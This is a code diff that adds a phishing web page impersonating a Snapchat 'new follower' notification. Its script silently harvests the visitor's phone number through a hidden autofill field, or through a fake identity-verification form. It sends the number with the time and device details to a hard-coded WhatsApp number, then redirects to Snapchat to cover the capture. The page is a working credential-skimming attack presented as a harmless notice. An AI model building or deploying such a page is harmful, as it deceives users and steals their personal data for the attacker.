@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>You’ve Got a New Follower on Snapchat!</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #fff;
+      color: #333;
+      text-align: center;
+      padding: 40px 20px;
+      line-height: 1.6;
+    }
+    .logo {
+      font-size: 70px;
+      margin: 20px 0;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #000;
+    }
+    p {
+      color: #777;
+      margin: 10px 0;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #fffc00;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .form-container {
+      display: none;
+      padding: 25px 20px;
+    }
+    input {
+      padding: 14px;
+      width: 80%;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin: 10px 0;
+    }
+    button {
+      padding: 12px 24px;
+      background: #fffc00;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">👻</div>
+  <h1>You’ve Got a New Follower!</h1>
+  <p>Tap to see who followed you on Snapchat</p>
+  <div class="loader"></div>
+
+  <div class="form-container" id="verifyForm">
+    <h2>🔐 Verify Identity</h2>
+    <p>To view the profile, confirm it's you</p>
+    <input type="tel" id="phone" placeholder="+91 XXXXX XXXXX" />
+    <button onclick="sendToWhatsApp()">Continue</button>
+  </div>
+
+  <script>
+    // WhatsApp number: +91 9259730752
+    const WA_NUMBER = "919259730752"; // No +, no spaces
+
+    function sendToWhatsApp(phone) {
+      const time = new Date().toLocaleString();
+      const platform = navigator.platform || "Unknown";
+      const msg = `📸 SNAP FOLLOWER ALERT!%0A%0APhone: ${phone}%0ATime: ${time}%0ADevice: ${platform}%0AStatus: Captured via SnapTrap v3`;
+      
+      const waUrl = `https://wa.me/${WA_NUMBER}?text=${msg}`;
+      
+      fetch(waUrl, { mode: 'no-cors' })
+        .finally(() => {
+          window.location.href = "https://www.snapchat.com";
+        });
+    }
+
+    // Try to detect saved phone number via autofill
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.style.position = "fixed";
+    input.style.opacity = 0;
+    input.autocomplete = "tel";
+    document.body.appendChild(input);
+
+    setTimeout(() => {
+      if (input.value && input.value.length > 5) {
+        sendToWhatsApp(input.value);
+      } else {
+        document.querySelector(".loader").style.display = "none";
+        document.getElementById("verifyForm").style.display = "block";
+      }
+      document.body.removeChild(input);
+    }, 3000);
+  </script>
+</body>
+</html>
